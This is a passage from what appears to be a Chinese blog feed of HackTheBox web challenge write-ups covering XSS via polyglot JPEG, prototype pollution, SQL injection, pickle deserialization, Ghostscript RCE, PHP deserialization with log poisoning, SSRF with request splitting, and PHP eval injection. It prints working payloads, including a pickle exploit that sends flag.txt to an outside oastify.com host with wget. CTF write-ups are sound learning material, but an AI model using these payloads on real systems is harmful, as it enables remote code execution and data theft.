src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-4.png" alt="avatar"></p><p>由此可以构造出XSS的POC(以用户名是admin为例)：</p><pre><code class="HTML">&lt;script charset=&quot;ISO-8859-1&quot; src=&quot;/api/avatar/admin&quot;&gt;&lt;/script&gt;123.123.</code></pre><p>提交即可：</p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-5.png" alt="submit"></p><p><img src="/2023/09/07/HackTheBox-TwoDots-horror-WriteUP/image-6.png" alt="get-flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里需要注意的是payload的使用方式，需要设置<code>charset=&quot;ISO-8859-1&quot;</code>属性，否则的话JavaScript代码无法加载。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://portswigger.net/research/bypassing-csp-using-polyglot-jpegs">Bypassing CSP using polyglot JPEGs</a></li><li><a href="https://github.com/s-3ntinel/imgjs_polygloter">Image Polyglot</a></li><li><a href="https://salucci.ch/2023/05/20/xss-with-a-jpg-jpeg-to-bypass-csp/">XSS with a JPG&#x2F;JPEG to bypass CSP</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> XSS </tag>
            
            <tag> Bypass CSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox breaking grad WriteUP</title>
      <link href="/2023/09/04/HackTheBox-breaking-grad-WriteUP/"/>
      <url>/2023/09/04/HackTheBox-breaking-grad-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>You and your buddy corrected the math in your physics teacher’s paper on the decay of highly excited massive string states in the footnote of a renowned publication. He’s just failed your thesis out of spite, for making a fool out of him in the university’s research symposium. Now you can’t graduate, unless you can do something about it… 🤷</p></blockquote><blockquote><p>(您和您的好友在一本著名出版物的脚注中更正了物理老师关于高激发大质量弦态衰变的论文中的数学计算。 他只是出于恶意而没通过你的论文，因为他在大学的研究研讨会上出丑了。 现在你无法毕业，除非你能做点什么……)</p></blockquote><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>Web页面很简单，目标似乎是通过某种方式，让我们的主角顺利毕业。分析代码我们可以看到，毕业的条件有两个：</p><ol><li>Paper评分大于等于10；</li><li>名字不是Baker或者Purvis；</li></ol><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-1.png" alt="pass"><br>得罪教授果然没什么好下场。</p><p>玩笑结束，我们来分析代码。可交互的路径就两个：<code>/debug/:action</code>和<code>/api/calculate</code></p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-2.png" alt="url"></p><p>通过跟踪参数的处理过程，我们大概可以锁定有问题的代码在<code>challenge\helpers\ObjectHelper.js</code>中（凭直觉）：</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-3.png" alt="oh"></p><p>坦白讲我对NodeJS一窍不通，所以看不出这段代码有什么问题，所以让我们问问万能的ChatGPT吧。</p><p>以下是ChatGPT的回答：</p><hr><p>让我们首先查看文件的内容，然后进行分析。</p><p>这段代码定义了一个名为 <code>ObjectHelper</code> 的模块，包含以下四个方法：</p><ol><li><p><strong>isObject(obj)</strong>:</p><ul><li>参数: <code>obj</code>（一个任意类型的对象）</li><li>返回值: 如果 <code>obj</code> 是一个函数或对象，返回 <code>true</code>，否则返回 <code>false</code>。</li><li>作用: 用于检查一个值是否是对象或函数。</li></ul></li><li><p><strong>isValidKey(key)</strong>:</p><ul><li>参数: <code>key</code>（一个字符串）</li><li>返回值: 如果 <code>key</code> 不等于 <code>&#39;__proto__&#39;</code>，则返回 <code>true</code>，否则返回 <code>false</code>。</li><li>作用: 用于检查一个键是否有效，主要是为了防止原型污染。</li></ul></li><li><p><strong>merge(target, source)</strong>:</p><ul><li>参数: <code>target</code> 和 <code>source</code>（两个对象）</li><li>返回值: 返回合并后的 <code>target</code> 对象。</li><li>作用: <ul><li>该方法用于将 <code>source</code> 对象的属性合并到 <code>target</code> 对象中。</li><li>如果 <code>source</code> 对象的某个键在 <code>target</code> 对象中也存在，并且它们的值都是对象，则会递归地合并这两个子对象。</li><li>否则，会直接将 <code>source</code> 对象的属性值赋给 <code>target</code> 对象的对应键。</li></ul></li></ul></li><li><p><strong>clone(target)</strong>:</p><ul><li>参数: <code>target</code>（一个对象）</li><li>返回值: 返回 <code>target</code> 对象的一个深拷贝。</li><li>作用: <ul><li>该方法用于创建一个新对象，并将 <code>target</code> 对象的属性复制到新对象中。</li><li>为了实现这一点，它实际上是调用了 <code>merge</code> 方法，将一个空对象和 <code>target</code> 对象合并。</li></ul></li></ul></li></ol><p>总结:<br>这是一个用于对象操作的实用程序模块，提供了对象合并、克隆和一些基本的验证功能。特别是，它通过 <code>isValidKey</code> 方法防止了潜在的原型污染，这是一个很好的安全实践。</p><hr><p>很好，ChatGPT说这段代码采取了某些方式防止“原型污染”，所谓此地无银三百两，这个题目八成是要搞原型污染了。<del>（脑补费翔：她明明是祥Ray！）</del></p><p>查阅若干资料之后，对NodeJS原型链污染漏洞大概有了个了解，类比一下就是，虽然龙生九子各有不同，但是如果我们通过龙的某个子嗣比如貔貅，改变了龙的某个属性，那么它的九个崽儿就都会继承这个属性（其实不恰当，实际上是调用的时候如果当前对象没有这个参数，就会向它的父对象搜索）。</p><p>题目中过滤了关键字<code>&#39;__proto__&#39;</code>，但是通过<code>constructor.prototype</code>，我们仍然可以实现原型链污染。接下来找到一个利用点，也就是能够执行系统命令的函数就可以了，这里我们选择<code>DebugHelper.js</code>中的fork函数。</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-4.png" alt="fork"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>构造Payload，获取Flag文件名（因为根据DockerFile，Flag文件名是随机的字符串）：</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-5.png" alt="calc"></p><p>然后访问<code>/debug/version</code>执行poc：</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-6.png" alt="ls"></p><p>最后读文件的内容就好了：</p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-7.png" alt="flag"></p><p><img src="/2023/09/04/HackTheBox-breaking-grad-WriteUP/image-8.png" alt="flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>做HTB真是被迫从零开始学习NodeJS</del></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://wiki.wgpsec.org/knowledge/ctf/js-prototype-chain-pollution.html">nodejs原型链污染 #</a></li><li><a href="https://y3a.github.io/2021/06/15/htb-breaking-grad/">HackTheBox Breaking Grad</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> nodejs原型链污染 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox C.O.P WriteUP</title>
      <link href="/2023/08/29/HackTheBox-C-O-P-WriteUP/"/>
      <url>/2023/08/29/HackTheBox-C-O-P-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!</p></blockquote><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image.png" alt="challenge"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p><code>routes.py</code>中可以看到两条URI：</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-1.png" alt="routes"></p><p>跟踪<code>product_id</code>,可以看到此处并未对传入的参数进行任何过滤，存在SQL注入：</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-2.png" alt="SQL injection"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>网站使用了Jinja2 模板引擎，主页代码如下：</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-3.png" alt="index"></p><p>这里会循环读取商品列表，获取数据库中商品的信息。另外我们可以看到网站设置了template_filter(‘pickle’)，所以这里会用<code>pickle_loads(s)</code>处理检索来的<code>product.data</code></p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-4.png" alt="app.py"></p><p>所以我们需要构造一条python的序列化数据，传入pickle_loads(s)并执行，从而实现RCE。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先使用python构造一条序列化数据，这里照着题目给的源码写就可以了。</p><pre><code class="python">import pickle, base64import osclass Exploit(object):    def __reduce__(self):        cmd = (&quot;wget --post-file flag.txt mf5rw3jw4to5z0jk3gclnr8gs7yxmm.oastify.com&quot;)        return (os.system, (cmd,))malicious_payload = pickle.dumps(Exploit())print(base64.b64encode(malicious_payload).decode())</code></pre><p>输出出来的Payload大概是这样的：</p><pre><code>gASVXwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjER3Z2V0IC0tcG9zdC1maWxlIGZsYWcudHh0IG1mNXJ3M2p3NHRvNXowamszZ2NsbnI4Z3M3eXhtbS5vYXN0aWZ5LmNvbZSFlFKULg==</code></pre><p>然后构造SQL注入Payload:</p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-5.png" alt="payload"></p><p><strong>PWN!</strong></p><p><img src="/2023/08/29/HackTheBox-C-O-P-WriteUP/image-6.png" alt="FLAG"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>开始做题的时候钻了牛角尖，绞尽脑汁想怎么把序列化的数据写到数据库里。</p><p>其实只要让查询语句返回的内容是自己构造好的序列化数据就可以了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> Python反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Diogenes&#39; Rage WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Having missed the flight as you walk down the street, a wild vending machine appears in your way. You check your pocket and there it is, yet another half torn voucher coupon to feed to the consumerism. You start wondering why should you buy things that you don’t like with the money you don’t have for the people you don’t like. You’re Jack’s raging bile duct.</p></blockquote><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image.png" alt="challenge"></p><blockquote><p><del>你是杰克汹涌的胆汁导管</del></p></blockquote><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>一开始看了组件以为是个JWT的漏洞，绞尽脑汁没有找到思路之后发现……</p><p>是个条件竞争。</p><p>淦。</p><p>存在漏洞的代码如下：</p><ul><li>database.js</li></ul><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-1.png" alt="vuln"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>首先调用<code>/api/purchase</code>获取cookie</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-2.png" alt="cookie"></p><p>开足线程跑就完了</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-3.png" alt="run！！"></p><p>拿到Flag</p><p><img src="/2023/08/23/HackTheBox-Diogenes-Rage-WriteUP/image-4.png" alt="Flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><del>万万没想到有一天会因为网速拿不到flag</del><br>条件竞争我怕不是跑了一百次……</p><blockquote><p>总之这是一个从头到尾充满槽点的Challenge</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> 条件竞争 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox petpet rcbee WriteUP</title>
      <link href="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><blockquote><p>Bees are comfy 🍯<br>bees are great 🌟🌟🌟<br>this is a petpet generator 👋<br>let’s join forces and save the bees today! 🐝</p></blockquote><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image.png" alt="Bee"></p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-1.png" alt="Web"></p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p><code>flag</code>文件的位置已经给出了，那么目标很明确，就是想办法读取到这个文件的内容。</p><p>代码中只有一个上传功能，python的站点通过上传木马GetShell显然是比较罕见的操作，那么更有可能的解题思路是对组件的漏洞进行利用。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-2.png" alt="routers.py"></p><p><code>DockerFile</code>中写入了安装<code>Pillow+ghostscript</code>的命令：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-3.png" alt="dockerfile"></p><p>关于这两个组件的介绍，我们可以问一下神奇的ChatGPT：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-4.png" alt="ChatGPT"></p><p><code>ghostscript-9.23</code>存在远程命令执行漏洞，漏洞详情参考：<a href="https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509">Python PIL&#x2F;Pillow Remote Shell Command Execution via Ghostscript CVE-2018-16509</a></p><p>对代码进行分析后可以发现，当前的上传功能完美符合漏洞的利用条件。那么接下来，只需要找到<code>flag</code>文件的绝对路径就可以了。这很好找：</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-5.png" alt="flag_path"></p><p>路径是<code>/app/flag</code></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>读取<code>/app/flag</code>内容并写入到可访问的静态路径下。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-6.png" alt="poc"></p><p>然后直接访问写入的文件即可。</p><p><img src="/2023/08/23/HackTheBox-petpet-rcbee-WriteUP/image-7.png" alt="flag"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p><del>开始的时候找错了绝对路径，还以为思路错了。</del></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> CVE-2018-16509 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox Toxic WriteUP</title>
      <link href="/2023/08/23/HackTheBox-Toxic-WriteUP/"/>
      <url>/2023/08/23/HackTheBox-Toxic-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>Humanity has exploited our allies, the dart frogs, for far too long, take back the freedom of our lovely poisonous friends. Malicious input is out of the question when dart frogs meet industrialisation. 🐸</p></blockquote><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image.png" alt="Toxic"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>源代码很简单，只有两个PHP文件</p><pre><code class="php">//index.php&lt;?phpspl_autoload_register(function ($name)&#123;    if (preg_match(&#39;/Model$/&#39;, $name))    &#123;        $name = &quot;models/$&#123;name&#125;&quot;;    &#125;    include_once &quot;$&#123;name&#125;.php&quot;;&#125;);if (empty($_COOKIE[&#39;PHPSESSID&#39;]))&#123;    $page = new PageModel;    $page-&gt;file = &#39;/www/index.html&#39;;    setcookie(        &#39;PHPSESSID&#39;,         base64_encode(serialize($page)),         time()+60*60*24,         &#39;/&#39;    );&#125; $cookie = base64_decode($_COOKIE[&#39;PHPSESSID&#39;]);unserialize($cookie);</code></pre><pre><code class="php">//PageModel.php&lt;?phpclass PageModel&#123;    public $file;    public function __destruct()     &#123;        include($this-&gt;file);    &#125;&#125;</code></pre><p>很显然，是一个PHP反序列化+文件包含的漏洞利用。</p><p>这里就需要找到一个可包含的日志文件，我们可以在<code>nginx.conf</code>中找到AccessLog文件的位置。</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-2.png" alt="AccessLog"></p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用<code>User-Agent</code>写入WebShell：</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-3.png" alt="UA"></p><p>构造包含AccessLog的序列化数据：</p><pre><code class="php">O:9:&quot;PageModel&quot;:1:&#123;s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;&#125;//base64encodeTzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==</code></pre><p>利用WebShell获得文件名和Flag</p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-4.png" alt="FileName"></p><p><img src="/2023/08/23/HackTheBox-Toxic-WriteUP/image-5.png" alt="Flag"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>非常简单的一个Challenge，很适合作为学习PHP反序列化的入门练习。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://xz.aliyun.com/t/12507">php反序列化完整总结</a></li></ul></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> PHP反序列化 </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox WeatherAPP WriteUP</title>
      <link href="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-WeatherAPP-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>A pit of eternal darkness, a mindless journey of abeyance, this feels like a never-ending dream. I think I’m hallucinating with the memories of my past life, it’s a reflection of how thought I would have turned out if I had tried enough. A weatherman, I said! Someone my community would look up to, someone who is to be respected. I guess this is my way of telling you that I’ve been waiting for someone to come and save me. This weather application is notorious for trapping the souls of ambitious weathermen like me. Please defeat the evil bruxa that’s operating this website and set me free! 🧙‍♀️</p></blockquote><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image.png" alt="WeatherAPP"></p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先看代码，代码给我们的线索有：</p><ol><li>Flag在<code>/app/flag</code>，需要以admin账户登录系统才能获得；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-2.png" alt="Flag File"></p><ol start="2"><li>admin账号的密码是16进制32Byte大小的随机字符串，暴力破解不用考虑了；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-3.png" alt="32Pass"></p><ol start="3"><li>注册账户功能存在SQL注入漏洞；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-4.png" alt="SQL Injection"></p><ol start="4"><li>注册账户功能限制源IP，仅限本地（127.0.0.1）使用；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-6.png" alt="Register"></p><ol start="5"><li>API<code>/api/weather</code>存在SSRF漏洞；</li></ol><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-5.png" alt="SSRF"></p><p>至此，思路基本清晰，即：<strong>利用SSRF漏洞，让服务器提交注册用户请求，覆盖掉admin账号的密码，从而取得Flag。</strong></p><p>唯一一个尚未解决的问题是，<code>/api/weather</code>接口只能提交GET请求，而注册用户是强制读取<code>Request Body</code>中的数据的。</p><p>那么，我们还需要寻找其他线索。</p><p><code>package.json</code>中显示，NodeJS版本为8.12.0</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-7.png" alt="NodeJS"></p><p>当前版本的NodeJS存在HTTP Request拆分漏洞，详见：<a href="https://hackerone.com/reports/409943">Node.js disclosed on HackerOne: Http request splitting</a></p><p>利用此漏洞，我们可以顺利通过服务器提交POST表单了。</p><p>完整思路：</p><ol><li>利用SSRF伪造服务器请求；</li><li>利用NodeJS组件漏洞提交POST表单；</li><li>利用注册功能的SQL注入漏洞覆盖掉admin账户的密码；</li><li>登录admin账户，获得Flag。</li></ol><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>利用Python构造并提交POC：</p><pre><code class="python"># poc.pyimport requestspayload = &#39;&#39;&#39;127.0.0.1/ HTTP/1.1Host: http://127.0.0.1POST /register HTTP/1.1Host: http://127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 88Connection: closeusername=admin&amp;password=1234&#39;) ON CONFLICT(username) DO UPDATE SET password = &#39;admin&#39;;--GET / HTTP/1.1Host: http://127.0.0.1test:&#39;&#39;&#39;.replace(&quot;\n&quot;,&quot;\r\n&quot;)payload = payload.replace(&#39;\r\n&#39;, &#39;\u010d\u010a&#39;) \    .replace(&#39;+&#39;, &#39;\u012b&#39;) \    .replace(&#39; &#39;, &#39;\u0120&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;) \    .replace(&#39;`&#39;, &#39;\u0127&#39;) \    .replace(&#39;&quot;&#39;, &#39;\u0122&#39;) \    .replace(&quot;&#39;&quot;, &#39;\u0a27&#39;) \    .replace(&#39;[&#39;, &#39;\u015b&#39;) \    .replace(&#39;]&#39;, &#39;\u015d&#39;)print(payload)burp0_url = &quot;http://167.172.61.89:32702/api/weather&quot;burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;Accept-Language&quot;: &quot;en-US,en;q=0.5&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Referer&quot;: &quot;http://167.172.61.89:32702/&quot;, &quot;Content-Type&quot;: &quot;application/json&quot;, &quot;Origin&quot;: &quot;http://167.172.61.89:32702&quot;, &quot;DNT&quot;: &quot;1&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;sec-ch-ua-platform&quot;: &quot;\&quot;Windows\&quot;&quot;, &quot;sec-ch-ua&quot;: &quot;\&quot;Google Chrome\&quot;;v=\&quot;113\&quot;, \&quot;Chromium\&quot;;v=\&quot;113\&quot;, \&quot;Not=A?Brand\&quot;;v=\&quot;24\&quot;&quot;, &quot;sec-ch-ua-mobile&quot;: &quot;?0&quot;&#125;burp0_json=&#123;&quot;city&quot;: &quot;Tokyo&quot;, &quot;country&quot;: &quot;JP&quot;, &quot;endpoint&quot;: payload&#125;resp = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)print(resp.text)</code></pre><p>登录admin，获得flag：</p><p><img src="/2023/08/22/HackTheBox-WeatherAPP-WriteUP/image-8.png" alt="Bingo"></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最早解题的时候是没有注意到NodeJS的版本的，一直卡在无法提交POST表单这一步，最后还是看了其他大佬的WriteUP。想了一些很抽象的办法，例如在服务器上设置一个HTML文件，访问到这个文件的时候自动提交Form表单。这个思路能成功的前提是，服务器会解析HTML和JavaScript。抱着试一试的心态尝试了一番，最后理所当然的失败了。这里将用到的HTML代码记录下来，权当消遣与纪念(代码是ChatGPT写的)。</p><pre><code class="HTML">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;    &lt;title&gt;自动提交表单&lt;/title&gt;    &lt;script type=&quot;text/javascript&quot;&gt;        window.onload = function() &#123;            document.forms[&quot;autoSubmitForm&quot;].submit();        &#125;    &lt;/script&gt;&lt;/head&gt;&lt;body&gt;    &lt;form id=&quot;autoSubmitForm&quot; action=&quot;http://127.0.0.1/register&quot; method=&quot;post&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;username&quot; value=&quot;admin&quot;&gt;        &lt;input type=&quot;hidden&quot; name=&quot;password&quot; value=&quot;admin&quot;&gt;    &lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><blockquote><p>PS: 今天七夕，在护网现场爆肝三篇WriteUP，感谢女朋友的鼓舞BUFF加持！</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.anquanke.com/post/id/241429">NodeJS 中 Unicode 字符损坏导致的 HTTP 拆分攻击</a></li><li><a href="https://blog.csdn.net/f_cccc/article/details/1164068">HTB之Weather App</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Web </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SSRF </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> HTTP Request拆分漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox LoveTok WriteUP</title>
      <link href="/2023/08/22/HackTheBox-LoveTok-WriteUP/"/>
      <url>/2023/08/22/HackTheBox-LoveTok-WriteUP/</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><blockquote><p>True love is tough, and even harder to find. Once the sun has set, the lights close and the bell has rung… you find yourself licking your wounds and contemplating human existence. You wish to have somebody important in your life to share the experiences that come with it, the good and the bad. This is why we made LoveTok, the brand new service that accurately predicts in the threshold of milliseconds when love will come knockin’ (at your door). Come and check it out, but don’t try to cheat love because love cheats back. 💛</p></blockquote><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image.png" alt="LoveTok"></p><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-1.png" alt="Web"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>题目有源码下载，理应是从源码中寻找漏洞了。<br>找来找去，只有<code>challenge/controllers/TimeController.php</code>中存在可控参数<code>$_GET[&#39;format&#39;]</code>：</p><pre><code class="php">&lt;?phpclass TimeController&#123;    public function index($router)    &#123;        $format = isset($_GET[&#39;format&#39;]) ? $_GET[&#39;format&#39;] : &#39;r&#39;;        $time = new TimeModel($format);        return $router-&gt;view(&#39;index&#39;, [&#39;time&#39; =&gt; $time-&gt;getTime()]);    &#125;&#125;</code></pre><p>跟踪定位到<code>TimeModel</code>类，代码如下：</p><pre><code class="php">&lt;?phpclass TimeModel&#123;    public function __construct($format)    &#123;        $this-&gt;format = addslashes($format);        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;    &#125;    public function getTime()    &#123;        eval(&#39;$time = date(&quot;&#39; . $this-&gt;format . &#39;&quot;, strtotime(&quot;&#39; . $this-&gt;prediction . &#39;&quot;));&#39;);        return isset($time) ? $time : &#39;Something went terribly wrong&#39;;    &#125;&#125;</code></pre><p>很显然，要绕过<code>addslashes()</code>函数，利用<code>getTime()</code>中的<code>eval()</code>来RCE了。</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>代码在<code>addslashes()</code>后没有对传入的参数做其他处理，不好闭合双引号。</p><p>但是如果使用动态变量的话，就不需要闭合双引号了。</p><blockquote><p>在 PHP 中，{} 用于复杂的变量解析。当字符串中的变量名称与其他字符相邻并可能引起混淆时，可以使用这种语法来明确地表示变量名。而 ${} 是一种特殊的语法，它允许你通过一个字符串来动态地生成变量名。<br>——ChatGPT</p></blockquote><p>Payload如下：</p><pre><code>GET /?format=r$&#123;$&#123;system(ls)&#125;&#125; HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-2.png" alt="ls"></p><p>但是<code>addslashes()</code>会对空格进行处理，我们也并没有在当前目录下找到flag，所以利用HTTP参数传入要执行的命令，是个好主意：</p><pre><code>GET /?format=r$&#123;$&#123;system($_GET[aa])&#125;&#125;&amp;aa=ls%20/ HTTP/1.1</code></pre><p><img src="/2023/08/22/HackTheBox-LoveTok-WriteUP/image-3.png" alt="ls /"></p><p>找到<code>flag</code>:</p><p><img 